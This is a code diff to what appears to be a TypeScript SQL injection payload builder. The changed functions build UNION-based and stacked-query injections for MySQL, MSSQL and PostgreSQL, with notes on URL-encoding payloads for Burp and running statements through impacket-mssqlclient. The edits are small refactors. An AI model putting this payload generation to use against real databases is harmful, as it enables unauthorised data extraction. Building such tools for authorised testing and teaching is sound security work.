@@ -104,8 +104,11 @@ function shown(c: Ctx, assume = true): number {
 
 /** A value read through the shown column (UNION) or on its own (session). */
 function data(c: Ctx, expr: string, from = "", suffix = ""): Core {
+  const plain = `SELECT ${expr}${fromDual(c, from + suffix)}`;
+  // A session runs the plain statement only: no UNION, so no column count or shown column to check.
+  if (c.point === "client-session") return { inject: "", plain };
   const r = shown(c);
-  return { inject: `AND 1=2 ${unionRow(c, { [r]: expr }, from + suffix)}`, plain: `SELECT ${expr}${fromDual(c, from + suffix)}` };
+  return { inject: `AND 1=2 ${unionRow(c, { [r]: expr }, from + suffix)}`, plain };
 }
 
 /**
@@ -128,7 +131,7 @@ function listing(c: Ctx, col: string, from: string, where = "", order = col): Co
       break;
     case "mssql":
       d = data(c, `(SELECT ${col}+' | ' FROM ${from}${where} FOR XML PATH(''))`);
-      if (c.point !== "client-session") c.notes.push("FOR XML PATH('') works on every MSSQL version (2017+ also has STRING_AGG). It escapes & and < as &amp; and &lt;.");
+      if (c.point !== "client-session") c.notes.push("FOR XML PATH('') works on MSSQL 2005 and later (2017+ also has STRING_AGG). It escapes & and < as &amp; and &lt;.");
       break;
   }
   return { inject: d.inject, plain };
@@ -323,9 +326,9 @@ export function buildSql(stepOrExecId: string, engine: SqlEngine, point: SqlPoin
   if (core.stacked && !session) parts.push({ token: ";", explain: "; ends the app's statement and starts a new one (a stacked query). Works on MSSQL and PostgreSQL, usually not on MySQL from PHP." });
   parts.push(...keywordParts(stmt, session));
   parts.push(...c.extra);
-  if (engine === "mysql" && !session && !core.bare) parts.push({ token: "# (alternative)", explain: "MySQL also accepts # as the comment; send it as %23 in a URL." });
 
   const notes = [...c.notes];
+  if (engine === "mysql" && !session && !core.bare) notes.push("MySQL also accepts # as the comment; send it as %23 in a URL.");
   if (point === "url-param") notes.push("URL-encoded: spaces as +, quotes, ; & > | = / as %XX, so it works pasted into the URL or Burp. The browser does not encode it again.");
   if (point === "form-field") notes.push("Raw text: type it in the field as shown; the browser does the URL-encoding when it submits.");
   if (session) notes.push("Plain statement for impacket-mssqlclient, mysql or psql: no quote break, no trailing comment, no encoding.");
